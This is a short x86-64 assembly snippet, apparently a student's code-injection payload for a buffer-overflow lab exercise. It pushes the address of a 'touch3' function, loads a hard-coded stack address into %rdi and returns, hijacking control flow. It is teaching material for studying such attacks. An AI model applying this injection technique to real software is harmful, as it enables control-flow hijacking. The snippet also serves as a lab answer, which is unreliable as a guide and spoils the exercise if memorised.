pushq    $0x4018fa            # push the touch3 address to stack
movq     $0x5561dca8, %rdi    # set rdi = rsp + 8 (offset due to the pushed value in rsp)
ret                           # transfer control to the first instruction in touch3
